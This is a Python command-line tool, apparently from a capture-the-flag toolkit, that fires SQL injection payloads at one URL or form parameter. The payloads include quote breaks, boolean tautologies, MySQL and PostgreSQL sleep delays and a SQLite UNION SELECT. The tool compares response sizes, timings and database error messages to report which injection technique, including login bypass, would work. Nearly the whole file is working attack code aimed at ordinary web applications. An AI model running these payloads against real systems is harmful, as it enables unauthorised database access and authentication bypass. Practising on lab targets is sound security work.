#!/usr/bin/env python3
"""Quick SQL injection detector for one parameter (FUZZ).

Compares responses to quote / balanced quote / boolean pairs / sleep,
and prints which technique looks usable plus DBMS hints from errors.

    python sqli_probe.py "http://sqli3.chal.deti:8032/photo/FUZZ" --base 1
    python sqli_probe.py "http://t/search?q=FUZZ"
    python sqli_probe.py http://t/login --data "username=FUZZ&password=x"
"""
import argparse
import html
import re
import time
from urllib.parse import quote

import requests

ERR = re.compile(r"SQL syntax|sqlite3?\.|SQLite|MariaDB|MySQL|mysqli|PDOException|ORA-\d+|PostgreSQL|psycopg|"
                 r"unterminated|unclosed quotation|near \"|syntax error|ODBC|SQLSTATE", re.I)


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("url")
    ap.add_argument("--data")
    ap.add_argument("--base", default="1", help="normal value for the parameter (default 1)")
    ap.add_argument("-c", "--cookie")
    a = ap.parse_args()
    hdr = {"Cookie": a.cookie} if a.cookie else {}

    def send(v):
        q = quote(v, safe="")
        t0 = time.perf_counter()
        if a.data:
            r = requests.post(a.url.replace("FUZZ", q), data=a.data.replace("FUZZ", q), timeout=30,
                              headers={**hdr, "Content-Type": "application/x-www-form-urlencoded"})
        else:
            r = requests.get(a.url.replace("FUZZ", q), headers=hdr, timeout=30)
        return r.status_code, html.unescape(r.text), time.perf_counter() - t0

    b = a.base
    tests = [
        ("base", b), ("quote", b + "'"), ("dquote", b + '"'), ("balanced", b + "''"),
        ("str-true", b + "' AND '1'='1"), ("str-false", b + "' AND '1'='2"),
        ("str-or", "zzz' OR '1'='1"), ("comment", b + "'-- "),
        ("num-true", b + " AND 1=1"), ("num-false", b + " AND 1=2"), ("num-math", "2-1" if b == "1" else b),
        ("sleep-mysql", b + "' AND SLEEP(3)-- -"), ("sleep-mysql-num", b + " AND SLEEP(3)"),
        ("sleep-pg", b + "' AND 1=(SELECT 1 FROM pg_sleep(3))--"),
        ("sqlite-version", "0 UNION SELECT sqlite_version()--"),
    ]
    res = {}
    for name, v in tests:
        try:
            st, body, dt = send(v)
        except requests.RequestException as e:
            print(f"{name:16} ERR {e}")
            continue
        res[name] = (st, len(body), dt, body)
        err = ERR.search(body)
        print(f"{name:16} {v!r:42} {st} {len(body):7d}B {dt:5.2f}s {('ERR: ' + err.group(0)) if err else ''}")
    base = res.get("base")
    if not base:
        return
    print("\n[analysis]")
    if any(ERR.search(res[k][3]) for k in ("quote", "dquote") if k in res):
        print(" - DB error on quote → injectable; error-based may work (06-sqli/error-based.md)")
    if "str-true" in res and "str-false" in res and res["str-true"][1] != res["str-false"][1]:
        print(" - string boolean differs → boolean blind (06-sqli/boolean-blind.md)")
    if "num-true" in res and "num-false" in res and res["num-true"][1] != res["num-false"][1]:
        print(" - numeric boolean differs → numeric context; try UNION (06-sqli/union-based.md)")
    if "str-or" in res and res["str-or"][1] > base[1]:
        print(" - OR 1=1 returns more → tautology works (login bypass / dump rows)")
    for k in ("sleep-mysql", "sleep-mysql-num", "sleep-pg"):
        if k in res and res[k][2] > base[2] + 2.5:
            print(f" - {k} delayed → time-based (06-sqli/time-blind.md)")


if __name__ == "__main__":
    main()
